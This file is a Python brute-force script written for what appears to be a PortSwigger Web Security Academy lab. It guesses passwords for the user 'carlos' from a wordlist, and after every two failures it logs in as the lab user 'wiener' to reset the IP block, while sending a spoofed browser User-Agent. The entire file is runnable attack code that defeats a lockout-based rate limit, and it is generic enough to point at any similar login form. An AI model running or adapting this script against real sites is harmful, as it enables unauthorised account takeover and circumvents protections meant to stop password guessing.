import requests
import time

# ---==[ SETTINGS - Modify these variables ]==---

# 1. Target website information
LOGIN_URL = "https://0a3500ab04209bf08096e42c00aa00f5.web-security-academy.net/login"  # The login page URL

# 2. Your successful login credentials (for resetting the block )
SUCCESS_USERNAME = "wiener"
SUCCESS_PASSWORD = "peter"

# 3. The username you want to attack
TARGET_USERNAME = "carlos"

# 4. Parameter names from the form (get them from Burp)
USERNAME_PARAM = "username"  # The name of the username field
PASSWORD_PARAM = "password"  # The name of the password field

# 5. The failure message (that appears on wrong password)
FAILURE_MESSAGE = "Incorrect password"

# 6. The list of passwords to try (can be loaded from a file)
try:
    with open("E:\path\passwords.txt", "r") as f:
        password_list = [line.strip() for line in f.readlines()]
except FileNotFoundError:
    print("[!] 'passwords.txt' not found. Using a small test list.")
    password_list = ["123456", "password", "123456789", "qwerty", "admin", "test1234"]

# 7. Delay between requests (in seconds) to avoid overwhelming the server
DELAY = 0.01

# ---==[ End of Settings ]==---


def perform_login(session, username, password):
    """
    Function to perform a single login attempt and return the response.
    """
    payload = {
        USERNAME_PARAM: username,
        PASSWORD_PARAM: password
    }
    try:
        # We add a User-Agent header to look like a real browser
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"
        }
        response = session.post(LOGIN_URL, data=payload, headers=headers, timeout=10)
        print(f"[*] Trying: Username: {username}, Password: {password}")
        return response
    except requests.RequestException as e:
        print(f"[!] Connection error: {e}")
        return None

def main():
    """
    The main function that manages the attack.
    """
    print("--- Starting Brute-force with periodic reset ---")
    
    # We use a session object to automatically handle cookies
    s = requests.Session()
    
    # A counter to track the number of failed attempts
    failed_attempts_counter = 0
    
    for password in password_list:
        # --- Step 1 & 2: Perform the brute-force attempts ---
        
        # Skip the correct password if it's in the list to avoid stopping the attack prematurely
        if password == SUCCESS_PASSWORD and TARGET_USERNAME == SUCCESS_USERNAME:
            continue

        response = perform_login(s, TARGET_USERNAME, password)
        
        if response is None:
            # If there was a connection error, wait a bit and try again
            time.sleep(DELAY * 5)
            continue

        # Check if the login was successful
        if FAILURE_MESSAGE not in response.text:
            print("\n" + "="*40)
            print(f"[+] !!! SUCCESS: Password Found !!!")
            print(f"[+] Username: {TARGET_USERNAME}")
            print(f"[+] Password: {password}")
            print("="*40)
            # Stop the attack since we found the password
            return
        else:
            print("[-] Login failed. (Expected)")

        failed_attempts_counter += 1
        time.sleep(DELAY)

        # --- Step 3: Check the attempt counter and perform the reset ---
        if failed_attempts_counter >= 2:
            print("\n[*] Reached the 2-attempt limit. Performing reset...")
            
            # Perform a successful login with your correct credentials
            reset_response = perform_login(s, SUCCESS_USERNAME, SUCCESS_PASSWORD)
            
            if reset_response and FAILURE_MESSAGE not in reset_response.text:
                print("[+] Reset successful. IP should be unblocked.")
            else:
                print("[!] Reset failed! You might be blocked. Stopping the attack.")
                return
            
            # Reset the counter to zero
            failed_attempts_counter = 0
            print("[*] Resuming brute-force attack...\n")
            time.sleep(DELAY)

    print("\n--- Finished password list. Password not found. ---")


if __name__ == "__main__":
    main()
